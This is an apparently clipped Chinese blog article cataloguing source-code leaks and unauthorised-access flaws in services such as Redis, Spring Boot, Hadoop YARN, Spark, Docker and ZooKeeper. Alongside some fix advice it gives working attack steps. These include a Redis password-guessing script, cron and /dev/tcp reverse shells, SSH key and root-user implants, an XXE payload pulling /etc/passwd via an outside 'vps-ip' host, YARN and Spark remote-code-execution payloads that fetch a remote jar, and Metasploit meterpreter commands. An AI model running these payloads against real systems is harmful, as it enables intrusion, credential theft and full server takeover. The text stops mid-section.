---
title: 敏感信息泄露总结
url: https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247509231&idx=1&sn=81aaf36f8829c1a9884894f164ba42d3&chksm=cfa500fcf8d289ea2979bd81568fd381a67bb852ec74ef1156fedb3179b990c720d19b0a0caf&mpshare=1&scene=1&srcid=0319Js3hhRc9plWlk9cqaYov&sharer_shareinfo=db95e324a39e9dd91b0ce6b44a0cee0f&sharer_shareinfo_first=db95e324a39e9dd91b0ce6b44a0cee0f#rd
clipped_at: 2024-03-19 10:08:51
category: default
tags: 
 - mp.weixin.qq.com
---


# 敏感信息泄露总结

  

  

本文为 @天明师傅原创投稿，部分图片来源于其他公众号和网络，文章较长，排版不易，给点个赞呗！

  

**1、源代码泄露**

**1.1、git 源码泄露**

Git 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个.git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。

  

漏洞利用工具：GitHack

```plain
https://github.com/lijiejie/GitHack
```

用法示例：  

```plain
GitHack.py http://www.openssl.org/.git/
```

修复建议：删除.git 目录或者修改中间件配置进行对.git 隐藏文件夹的访问。

  

### **1.2、SVN 源码泄露**

SVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到 WEB 服务器上，这就使.svn 隐藏文件夹被暴露于外网环境，可以利用.svn/entries 文件，获取到服务器源码。

  

漏洞利用工具：Seay SVN 漏洞利用工具

![图片](assets/1710814131-ce7a48b0cf5c6238763e3e9725040301.jpg)

  

修复建议：删除 web 目录中所有.svn 隐藏文件夹，开发人员在使用 SVN 时，严格使用导出功能，禁止直接复制代码。

  

### **1.3、hg 源码泄漏**

Mercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成.hg。

  

漏洞利用工具：dvcs-ripper

```plain
https://github.com/kost/dvcs-ripper
```

用法示例：

```plain
rip-hg.pl -v -u http://www.example.com/.hg/
```

  

### **1.4、CVS 泄露**

CVS 是一个 C/S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root 以及 CVS/Entries 目录，直接就可以看到泄露的信息。

```plain
http://url/CVS/Root 返回根信息
http://url/CVS/Entries 返回所有文件的结构
```

漏洞利用工具：dvcs-ripper

```plain
https://github.com/kost/dvcs-ripper.git
```

运行示例：

```plain
rip-cvs.pl -v -u http://www.example.com/CVS/
```

  

### **1.5、Bazaar/bzr 泄露**

bzr 也是个版本控制工具，虽然不是很热门，但它也是多平台支持，并且有不错的图形界面。

运行示例：

```plain
rip-bzr.pl -v -u http://www.example.com/.bzr/
```

  

### **1.6、网站备份压缩文件**

管理员将网站源代码备份在 Web 目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。

常见的备份文件后缀：

```plain
.rar
.zip
.7z
.tar
.gz
.bak
.txt
.old
.temp
```

漏洞利用工具：御剑  

![图片](assets/1710814131-6a65f8cca3dbd4993b7b7bc3b366bd46.jpg)

  

### **1.7、WEB-INF/web.xml 泄露**

WEB-INF 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。

WEB-INF 主要包含以下文件或目录：

```plain
WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.
WEB-INF/database.properties : 数据库配置文件
WEB-INF/classes/ : 一般用来存放Java类文件(.class)
WEB-INF/lib/ : 用来存放打包好的库(.jar)
WEB-INF/src/ : 用来放源代码(.asp和.php等)
config/config-properties
configure/configure.properties
applicationContext.xml
sysconfig-properties
config.xml
jdbc.properties
```

通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。  

  

### **1.8、DS\_Store 文件泄露**

.DS\_Store 是 Mac 下 Finder 用来保存如何展示 文件 / 文件夹 的数据文件，每个文件夹下对应一个。如果将.DS\_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。

漏洞利用工具：

```plain
https://github.com/lijiejie/ds_store_exp
```

用法示例：  

```plain
ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store
```

  

### **1.9、SWP 文件泄露**

swp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。除了 swp 以外还有.swo 和.swn 结尾的文件。

Vim 意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。例如，第一次产生的交换文件名为 “.file.txt.swp”；再次意外退出后，将会产生名为 “.file.txt.swo” 的交换文件；而第三次产生的交换文件则为 “.file.txt.swn”；依此类推。

  

**漏洞利用：**

```plain
.swp：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。
.swo：直接从指定的交换文件进行恢复
```

```plain
vim -r file.txt.swo
```

###   

### **1.10、war 文件泄露**

war 文件信息泄露是指部署在 war 文件由于配置不当，导致其整个报文件以及其他重要的配置文件信息避露，例如可以直接浏览目录，获取其下面的配置文件：WEB-INF/jdbc.properties.jdbc.properties 为数据库链接配置文件。包含数据库链接的账户和密码等重要信息，\[打并 war，看代码\]

  

**2、中间件导致的文件泄露**

**2.1、apache tomcat 示例文件漏洞**

Tomcat 示例目录漏洞是指在 Tomcat 的默认安装中，存在一个名为 "examples" 的目录，该目录中包含了一些示例程序和文档，这些示例程序可能存在安全漏洞，如果未经适当配置，可能导致攻击者通过网络访问该目录，进而获取服务器上的敏感信息或执行攻击代码。

常见路径：

```plain
/examples/servlets/servlet/CookieExample
/examples/servlets/servlet/RequestHeadersExample
/examples/jsp/snp/snoop.jsp
/examples/async/async1/examples/servlets/servlet/CookieExample
/examples/servlets/servlet/RequestHeadersExample
/examples/jsp/snp/snoop.jsp
/examples/async/async1
```

挖洞示例：  

```plain
挖洞经验 | 通过Tomcat Servlet示例页面发现的Cookie信息泄露漏洞
https://www.freebuf.com/articles/web/247253.html
```

  

**防御措施：**

-   禁用示例程序：在生产环境下，建议禁用 Tomcat 的示例程序，可以通过修改配置文件 $CATALINA\_HOME/conf/server.xml，在节点中设置 "deployIgnore" 属性，将其设置为 "examples"，即可禁用该目录下的示例程序。
    
-   删除示例程序：对于已经安装的 Tomcat 实例，建议删除 "examples" 目录中的示例程序，以避免攻击者利用其中的漏洞进行攻击。
    
-   设置访问控制：建议在配置文件 $CATALINA\_HOME/conf/web.xml 中，设置对 "examples" 目录的访问控制，以防止未授权的用户访问该目录。
    
-   更新 Tomcat 版本：及时更新 Tomcat 版本，以获取最新的安全补丁，以避免已知的安全漏洞。
    

  

### **2.2. IIS 短文件名**

此漏洞实际是由 HTTP 请求中旧 DOS 8.3 名称约定 (SFN) 的代字符 (~) 波浪号引起的。它允许远程攻击者在 Web 根目录下公开文件和文件夹名称 (不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。

IIS 的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回 404，访问构造的某个不存在的短文件名，返回 400。为了兼容 16 位 MS-DOS 程序，Windows 为文件名较长的文件 (和文件夹) 生成了对应的 windows 8.3 短文件名。

漏洞利用：

https://github.com/lijiejie/IIS\_shortname\_Scanner

```plain
iis_shortname_Scan.py target
```

  

### **2.3. tomcat 泄露**

在 tomcat 服务下，只要把 jsp 文件后缀名改为大写就会显示源码。

  

**3、组件未授权访问漏洞**

**3.1、druid 未授权访问漏洞**  

常见的页面泄露

```plain
html:
ip/druid/index.html       ##Druid Index
ip/druid/sql.html         ##Druid sql监控页面
ip/druid/weburi.html      ##Druid Web URI监控页面
ip/druid/websession.html  ##Druid Web Session监控页面

json:
ip/druid/weburi.json      ##Druid Web URI json
ip/druid/websession.json  ##Druid Web Session json

Druid 登录接口：
ip/druid/login.html       ##Druid登录认证页面
```

google hacking 语法：  

```plain
intitle:Druid Stat Index
```

![图片](assets/1710814131-be7ff9d153c11d98f7b2bd3f07448fff.png)

进一步利用如果有的时候 session 存在可以进行 session 获取伪造

```plain
推荐工具：https://github.com/yuyan-sec/druid_sessions/
```

使用效果如下：

![图片](assets/1710814131-e164b16f7ae57f1472549c71563681d4.png)

  

### **3.2、redis 未授权或弱口令**

#### **3.2.1. 漏洞原因：**

-   redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；
    
-   没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。
    

  

#### **3.2.2. 漏洞利用**

##### 1）批量判断脚本：

```plain
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import socket
import sys
PASSWORD_DIC=['redis','root','oracle','password','p@aaw0rd','abc123!','123456','admin']
def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            return u"未授权访问"
        elif "Authentication" in result:
            for pass_ in PASSWORD_DIC:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send("AUTH %s\r\n" %(pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    return u"存在弱口令，密码：%s" % (pass_)
    except Exception, e:
        pass
if __name__ == '__main__':
    ip=sys.argv[1]
    port=sys.argv[2]
    print check(ip,port, timeout=10)
```

##### 2）登录 redis

```plain
redis-cli -h 192.168.1.1    # 未授权利用
redis-cli -h 192.168.1.1 -a "password"    # 弱口令利用，-a指定服务器使用的弱口令。
```

![图片](assets/1710814131-bd2311d0aec99d6aa7f9c7f37d1c80f4.png)

  

##### 3）写入 webshell

```plain
config set dir /root/
config set dbfilename 111.php
set webshell "<?php phpinfo(); ?>"
save
```

![图片](assets/1710814131-e9b70e4f3ca07dc06199e655808b7c66.png)

  

##### **4）写入公钥，获取 root 权限**

前提：redis 是以 root 身份运行

```plain
mkdir /root/.ssh
config set dir /root/.ssh
config set dbfilename authorized_keys
set xxx "\n\n\n本地公钥信息\n\n\n"         #"本地公钥信息"替换为自己的公钥信息
save
```

![图片](assets/1710814131-c1f4735cbd71c7a718a53b2b1074a6e3.png)

  

##### **5）crontlab 反弹 shell**

攻击者服务器上启动一个监听端口

```plain
nc -lvnp 4444
```

写入对应计划任务  

```plain
redis-cli -h 192.168.0.104 -p <port_number> -a "password"
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.104/4444 0>&1\n\n"

config set dir /var/spool/cron
config set dbfilename root
save
```

##### **6）主从复制 RCE**

原理：Redis 实例设置主从模式的时候，Redis 的主机实例就可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载 so 文件，进而进行执行拓展的新命令。

```plain
https://github.com/n0b0dyCN/redis-rogue-server
```

![图片](assets/1710814131-9270011b13e76c5dd1103df0d8343f6f.png)

```plain
https://github.com/Ridter/redis-rce
```

![图片](assets/1710814131-65103b800340637af08b54f646c772b9.png)

  

### **3.3. mangodb 未授权**

-   概念：MongoDB 是一个基于分布式文件存储的数据库，且默认端口
    
-   产生原因：开启 MongoDB 服务时不添加任何参数时，默认是没有权限验证的，登录的用户可以通过默认端口无需密码对数据库任意操作 (增删改高危动作) 而且可以远程访问数据库
    
-   漏洞利用：ip: 端口（访问即可，默认是 27017）
    

  

工具：

```plain
Navicat：https://navicat.com.cn/
chat2db：https://github.com/chat2db/Chat2DB
```

  

### **3.4、javaMelody**

特征：

![图片](assets/1710814131-f58336c30627b4bfffb0afc6eafd1767.png)

  

页面：/monitoring

  

### **3.5、swagger 未授权访问漏洞**

常见路径：

```plain
/swagger-ui.html
/swagger/swagger-ui.html
/api/swagger-ui.html
/v1.x/swagger-ui.html
/swagger/index.html
swagger-ui.html#/api-memory-controller
/swagger/ui/
swagger-ui
```

应用页面：  

![图片](assets/1710814131-4fc3d6f3b0adb378219323a880658334.png)

  

swagger 扫描工具

```plain
https://github.com/lijiejie/swagger-exp
```

![图片](assets/1710814131-5905ac258734a069d0c7e318cc3209ba.png)

  

### **3.6、spring cloud 未授权访问漏洞**

**spring boot 判断方法：  
**

**1）图标判断法**

下图的小绿叶就是 spring cloud 的默认 ico 文件。

![图片](assets/1710814131-5cd195bbdda5ed1a4c25787bdcac2ecf.png)

  

**2）报错信息**

若 ico 文件更改，随意输入不存在的路径，如产生以下报错即为 spring  boot 框架。

![图片](assets/1710814131-b36bc77ceb845da81737d56582e71829.png)

  

路径漏洞利用：

```plain
/jolokia/list#并且返回的json中有“reloadByURL”，关于路径问题：1.x版本的在根路径下注册路由
/autoconfig 提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过
/beans 描述应用程序上下文里全部的Bean，以及它们的关系
/env 获取全部环境属性,数据库账户密码泄露，可获取mysql，managodb数据库的用户名和密码
/configprops 描述配置属性(包含默认值)如何注入Bean
/dump 获取线程活动的快照
/health 报告应用程序的健康指标，这些值由HealthIndicator的实现类提供,git项目地址泄露,可获取git项目的地址
/info 获取应用程序的定制信息，这些信息由info打头的属性提供
/mappings 描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系
/metrics 报告各种应用程序度量信息，比如内存用量和HTTP请求计数
/shutdown 关闭应用程序，要求endpoints.shutdown.enabled设置为true
/trace 提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)获取用户认证字段信息,，比如如下站点存在 actuator 配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP 头等），还有用户 token、cookie 字段
/heapdump 路径 #泄露站点内存信息,很多时候会包含用户的账户和密码
```

路径及含义：

![图片](assets/1710814131-05d6a31fb1f4e5c7678e9df6bd07802a.png)

![图片](assets/1710814131-a2485783bd62e1fe4750ea19f904b0ae.png)

  

**进阶利用**

Jolokia 利用和 env 进阶利用思路

```plain
https://blog.csdn.net/weixin_39620370/article/details/111200210
```

利用 /jolokia/exec 结合起来进行利用

服务端文件

```plain
1.fire.xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://vps-ip/fire.dtd">%remote;%int;]>
<a>&trick;</a>

2.fire.dtd
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```

客户端 payload：

```plain
http://target-url/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/vps-ip!/fire.xml
```

详细渗透技巧参考：

https://github.com/LandGrey/SpringBootVulExploit

  

### **3.7、Elasticsearch 未授权访问**

**漏洞原因：**

Elasticsearch 是用 Java 开发的企业级搜索引擎，默认端口 9200，存在未授权访问漏洞时，可被非法操作数据。

  

**接口：**

```plain
/_nodes #查看节点数据
/_cat/indices #索引
_cat/indices
/_plugin/head
/_nodes/
/_status
/_search?pretty
```

  

应用页面：

![图片](assets/1710814131-0a5bfe7858511373db1ca79c844ffb16.png)

  

漏洞利用工具：

```plain
es-client：https://www.yuque.com/baozhiyige-tewwf/ygxv4r/ckis52alep5g7mgv
```

![图片](assets/1710814131-e426f773a3793fb65c16fdd108564f6c.png)

  

### **3.8、jenkins 未授权访问漏洞**

**概念：**是一个开源软件项目，是基于 Java 开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。

  

后台页面：

![图片](assets/1710814131-d3ed2588c528e6f0e6b5d399ac64e042.png)

  

漏洞地址：

```plain
http://192.168.254.151:8080/manage
http://192.168.254.151:8080/script
```

未授权访问到 script 后可进行命令执行，常见命令：

```plain
查询当前用户
println "whoami".execute().text

查看ip配置信息
println "ifconfig -a".execute().text
```

###   

### **3.9、Jboss 未授权访问漏洞**

**概念：**JBoss 是一个基于 J2EE 的开放源代码的应用服务器。(个人更加喜欢理解为组件服务器)  

**漏洞原因：**JBoss 默认访问 jmx-console 页面不需要输入密码，或者默认密码 admin/admin

批量利用工具：

```plain
https://github.com/joaomatosf/jexboss
```

  

### **3.10、hadoop YARN resourcemanager 未授权访问漏洞**

**概念：**是一个由 Apache 基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。

示例页面：

![图片](assets/1710814131-500feb7adbb71bf86ce6a0e33ca794f0.png)

  

利用工具：msf 的 hadoop-unauth-exec 模块，利用截图：

![图片](assets/1710814131-c184802fd744907d67671088d7f29c5b.png)

  

python 脚本：

```plain
import requests

#python3
target = 'http://192.168.178.128:8088/'  # put your remote host IP here
lhost = '192.168.178.129'  # put your local host IP here

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
print(resp.text)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
print (data)
requests.post(url, json=data)
```

  

利用截图：

![图片](assets/1710814131-cef24a5273e62140dbb1ac0f611137a1.png)

获取到的 shell：

![图片](assets/1710814131-89349a73f9bf3dc2d6b611eadee1f8f5.png)

  

**参考文章：**

```plain
【漏洞复现】Hadoop YARN 资源管理系统 REST API未授权访问
https://blog.csdn.net/weixin_43486390/article/details/111319422
```

  

### **3.11、Hadoop YARN RPC 未授权访问漏洞**

漏洞简介：Hadoop Yarn 作为 Hadoop 核心组件之一，负责将资源分配至各个集群中运行各种应用程序，并调度不同集群节点上的任务执行。Hadoop Yarn 默认对外开放 RPC 服务，攻击者可利用 RPC 服务执行任意命令，控制服务器。

同时由于 Hadoop Yarn RPC 服务访问控制机制开启方式与 REST API 不一样，因此即使在 REST API 有授权认证的情况下，RPC 服务所在端口仍然可以未授权访问。

**漏洞利用：**

#### 1）确认端口状态：

```plain
[root@localhost tmp]# curl http://192.168.32.183:8032
It looks like you are making an HTTP request to a Hadoop IPC port. This is not the correct port for the web interface on this daemon.
```

![图片](assets/1710814131-9166b3dc33ee3595575f5ed177ae583a.png)

  

#### 2）ping dnslog

```plain
EXP：https://github.com/cckuailong/YarnRpcRCE
```

```plain
[root@localhost YarnRpcRCE-master]# java -jar YarnRpcUnauth.jar 192.168.32.183:8032 "curl 0dccw6.dnslog.cn"
log4j:WARN No appenders could be found for logger (org.apache.hadoop.util.Shell).
log4j:WARN Please initialize the log4j system properly.
log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.
```

dnslog 记录：  

![图片](assets/1710814131-d1e24696f9afe101821d798a5a37b4d2.png)

  

查看日志：

![图片](assets/1710814131-8ce1ae9d7f021f9fa200ffa616f8ed73.png)

  

#### 3）反弹 shell：

```plain
# 执行命令
[root@localhost YarnRpcRCE-master]# java -jar YarnRpcUnauth.jar 192.168.32.183:8032 "bash -i >& /dev/tcp/192.168.32.183/9999 0>&1"

# 设置监听
[root@localhost tmp]# nc -lvp 9999
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 172.19.0.5.
Ncat: Connection from 172.19.0.5:59812.
bash: cannot set terminal process group (271): Inappropriate ioctl for device
bash: no job control in this shell
<00863_0003/container_1658816800863_0003_01_000001# whoami
whoami
root
<00863_0003/container_1658816800863_0003_01_000001#
```

![图片](assets/1710814131-ab836f2cc498858a914451df2fabc916.png)

  

**漏洞修复：**

```plain
Apache Hadoop官方建议用户开启Kerberos认证。
设置Hadoop RPC服务所在端口仅对可信地址开放。
建议升级并启用Kerberos的认证功能，阻止未经授权的访问。
```

  

### **3.12、Kafka Manager 未授权访问漏洞**

简介：Kafka Manager 是一款用于管理和监控 Apache Kafka 集群的工具。如果 Kafka Manager 未正确配置并对外开放，攻击者可能会未授权访问 Kafka Manager，从而获取敏感信息，如 Kafka 集群的配置和使用情况。

此外，如果攻击者具有足够的权限，他们还可以操作 Kafka 集群，如创建主题、修改配置等，对系统造成威胁。

  

**漏洞利用：**

访问 9000 端口，即可未授权访问 Kafka 管理界面

![图片](assets/1710814131-557c270382d2539fd36e1b18b89fde34.png)

  

查看集群信息。

![图片](assets/1710814131-1b03f318c02f3ac1f522a975ba40eb0b.png)

  

### **3.13、kibana 未授权访问漏洞**

介绍：可以用 kibana 搜索、查看存放在 Elasticsearch 中的数据。默认端口是 5601。

```plain
fofa:/app/kibana
```

利用方法：

```plain
http://<target_IP>:5601/app/kibana#/
```

![图片](assets/1710814131-4addcc97d16aa4932a0d92787e86dfb2.png)

  

### **3.14、Apache Spark 未授权访问**

简介：Apache Spark 是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向 Master 节点提交一个应用，Master 节点会分发给 Slave 节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁 Spark 集群整体的安全性。

应用页面：

![图片](assets/1710814131-cd804d09c32841d57703085dc3b50d19.png)

![图片](assets/1710814131-4ba94056a8e20af13b85cb6d7f14ccea.png)

  

**漏洞利用**

#### **1、REST API**

构造 payload

```plain
POST /v1/submissions/create HTTP/1.1
Host: your-ip:6066
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Content-Type: application/json
Connection: close
Content-Length: 680

{
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "2.3.1",
  "appArgs": [
    "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
  ],
  "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
  "environmentVariables": {
    "SPARK_ENV_LOADED": "1"
  },
  "mainClass": "Exploit",
  "sparkProperties": {
    "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
    "spark.driver.supervise": "false",
    "spark.app.name": "Exploit",
    "spark.eventLog.enabled": "true",
    "spark.submit.deployMode": "cluster",
    "spark.master": "spark://your-ip:6066"
  }
}
```

此处构建数据包时建议先访问：http://your-ip:6066，然后在获取到数据包的基础上再改成上面的 payload。

![图片](assets/1710814131-e10fa140968ed589938f163aba95f712.png)

  

其中，spark.jars 即是编译好的应用，mainClass 是待运行的类，appArgs 是传给应用的参数。此时访问 http://your-ip:8081 已经加载了 exploit.jar

![图片](assets/1710814131-5fc6460b833b77c8cc49b155c7c851b2.png)

  

返回的包中有 submissionId (driver-20220516074753-0000)，然后访问 http://your-ip:8081/logPage/?driverId={submissionId}&logType=stdout，即可查看执行结果：

![图片](assets/1710814131-e42754134a96d97ef452d029ee2e17a3.png)

  

#### **2、利用 submissions 网关（集成在 7077 端口中）- 测试失败**

如果 6066 端口不能访问，或做了权限控制，我们可以利用 master 的主端口 7077，来提交应用。方法是利用 Apache Spark 自带的脚本 bin/spark-submit：

```plain
bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
```

如果你指定的 master 参数是 rest 服务器，这个脚本会先尝试使用 rest api 来提交应用；如果发现不是 rest 服务器，则会降级到使用 submission gateway 来提交应用。  

  

#### **3、MSF**

```plain
msf5>use exploit/linux/http/spark_unauth_rce
msf5>set payload java/meterpreter/reverse_tcp
msf5>set rhost 192.168.100.2
msf5>set rport 6066
msf5>set lhost 192.168.100.1
msf5>set lport 4444
msf5>set srvhost 192.168.100.1
msf5>set srvport 8080
msf5>exploit
```

![图片](assets/1710814131-060f3aafae8e718170ed836e39e439d3.png)

  

参考文章：

```plain
Spark 未授权访问漏洞
https://icybersec.gitbook.io/cybersecuritynote/an-quan-lou-dong/wei-shou-quan-lou-dong/spark-wei-shou-quan-fang-wen-lou-dong
```

  

### **3.15、VNC 未授权访问漏洞**

概念：VNC 是虚拟网络控制台 Virtual Network Console 的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司 AT&T 的欧洲研究实验室开发。VNC 是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。

VNC 默认端口号为 5900、5901，如果是云桌面，端口号会一直往上增加，ip 数量取决于使用者的数量。

漏洞利用：

```plain
vnc-viewer 1.1.1.1:5900
```

![图片](assets/1710814131-0c2e4cc9c9920414910436c4b018600b.png)

  

修复方法：给 vnc 配置密码

  

### **3.16、docker-remote-api 未授权访问漏洞**

漏洞简介：由于 docker 安装后是默认不允许远程访问的，但是可以使用 docker\_remote\_api 开启 dcoker 远程访问，虽然这样可以远程访问了，但是直接暴露在公网上的 2375 端口是非常危险的，导致所有人都可以远程操作这台主机上的 Docker。

  

**检测方式：**

```plain
 info：访问ip:2375/info，返回界面包含有docker.io的关键词，则存在漏洞。
 version：访问ip:2375/versioin，返回界面包含有docker.io的关键词，则存在漏洞。
 /images/json：访问ip:2375/v1.25/images/json，可获取所有的images列表。
 /containers/json：访问ip:2375/containers/json，会返回服务器当前运行的 container 列表
```

  

**漏洞利用：**

#### **1、定时任务：**

```plain
import docker
client = docker.DockerClient(base_url='http://ip:2375)
data = client.containers.run('alpine:latest', r'''sh -c "echo '*
* * * * /usr/bin/nc ip:
```

#### **2、写入公钥**

1）生成公钥：

```plain
ssh-keygen -t rsa     # 一路回车即可
```

2）利用 docker 创建容器，挂载宿主机目录

```plain
docker -H tcp://ip:2375 run –rm –privileged -it -v /:/mnt busybox chroot /mnt bash  
```

3）写入公钥  

```plain
echo "<ssh_public_key>" >> /root/.ssh/authorized_keys
```

4）使用私钥连接

```plain
ssh -i /home/kali/.ssh/id_rsa root@ip
```

  

#### **3、创建 root 权限用户**

1）生成密码：

```plain
openssl passwd -1 -salt smile 123456
$1$smile$DNeWXby8cmrhHOsfR5Fhi1
```

2）构造插入命令  

```plain
sed -i '$a smile:$1$smile$DNeWXby8cmrhHOsfR5Fhi1:0:0:root:/root:/bin/sh'  /mnt/etc/passwd
```

3）写入 /mnt/etc/passwd  

```plain
sed -i '$a smile:$1$smile$DNeWXby8cmrhHOsfR5Fhi1:0:0:root:/root:/bin/sh' /mnt/etc/passwd
```

**修复方案：**

```plain
关闭2375端口（尤其是公网情况下一定要禁用此端口），如果必须使用的话，可以采用如下的加固方式：设置ACL，仅允许信任的来源IP连接；设置TLS认证，官方的文档为Protect the Docker daemon socket
Docker是以root权限运行的，这是所有姿势的前提
Docker在运行一个容器的时候可以将宿主机上的一个目录挂载到容器内的一个目录，来进行docker逃逸， 还可以通过crontab写计划任务反弹shell
在docker api服务器前面加一个代理，例如nginx，设置 401 认证
客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1
```

```plain
export DOCKER_CERT_PATH=~/.docker
export DOCKER_HOST=tcp://10.10.10.10:2375
export DOCKER_API_VERSION=1.12
```

  

### **3.17、docker registry API 未授权访问**

简介：Docker registry HTTP API 是促进将映像分发到 docker 引擎的协议。它与 docker 注册表的实例进行交互，该注册表是一项管理有关 docker 映像的信息并启用其分发的服务。该规范涵盖了该 API 版本 2（称为 Docker 注册表 HTTP API V2）的操作。

网上关于这个漏洞的文章还是挺少的，大部分都是 docker remote api 未授权的漏洞。从其他人的使用信息来看该漏洞可以获取镜像信息、删除镜像什么的，具体还能做什么就要深挖官方文档了。

  

**漏洞利用：**

获取镜像列表：

```plain
http://1.1.1.1:5555/v2/_catalog
```

![图片](assets/1710814131-2f88d5eed904d42783ff3c98d1e69831.png)

  

获取仓库中镜像的 tags 列表

```plain
http://1.1.1.1:5555/v2/geoglobe-servicemgr/tags/list
```

更多接口：  

```plain
https://github.com/distribution/distribution/blob/5cb406d511b7b9163bff9b6439072e4892e5ae3b/docs/spec/api.md
```

  

**漏洞修复：**

设置 ACL，只允许信任的 IP 端口连接对应端口

  

**参考文章：**

```plain
docker registry v2 API的使用
https://blog.csdn.net/kan2016/article/details/86105354

Docker Registry API未授权访问漏洞
https://www.cnblogs.com/taoqinggang/articles/17863783.html
```

  

### **3.18、zookeeper 未授权访问漏洞**

介绍：ZooKeeper 是一个分布式的，开放源码的分布式应用程序协调服务，是 Google 的 Chubby 一个开源的实现，是 Hadoop 和 Hbase 的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。zookeeper 未授权访问是指安装部署之后默认情况下不需要任何身份验证，从而导致 zookeeper 被远程利用，导致大量服务级别的信息泄露。

默认使用端口：2181、2182。

**漏洞利用：**

```plain
echo conf | nc xx.xx.xx.xx 2181 输出相关服务配置的详细信息，端口、数据路径、日志路径、session 超时时间，最大连接数等。
echo envi | nc xx.xx.xx.xx 2181 输出服务器的详细信息。
echo dump | nc xx.xx.xx.xx 2181 | more 输出未处理的会话和临时节点，
leader 节点有效。
echo cons | nc xx.xx.xx.xx 2181 | more 列出所有连接到当前服务器的客户
端/会话的详细信息。
```

  

**漏洞防御：**给 zookeeper 增加身份校验配置

  

### **3.19、rsync 未授权访问漏洞**

介绍：rsync 是 Linux 下一款数据备份工具，支持通过 rsync 协议、ssh 协议进行远程文件传输。开启了 rsync 服务但是没设置配置密码，因此攻击者可以读写该服务。

**漏洞检测及利用：**

```plain
nmap检测
nmap -p 873 --script rsync-list-modules 192.168.193.128

连接后进行执行的常见命令
①查看模块列表
rsync rsync://your-ip:873/

②列出模块下文件
rsync rsync://your-ip:873/src/

③下载文件
rsync -av rsync://your-ip:873/src/etc/passwd

④上传文件
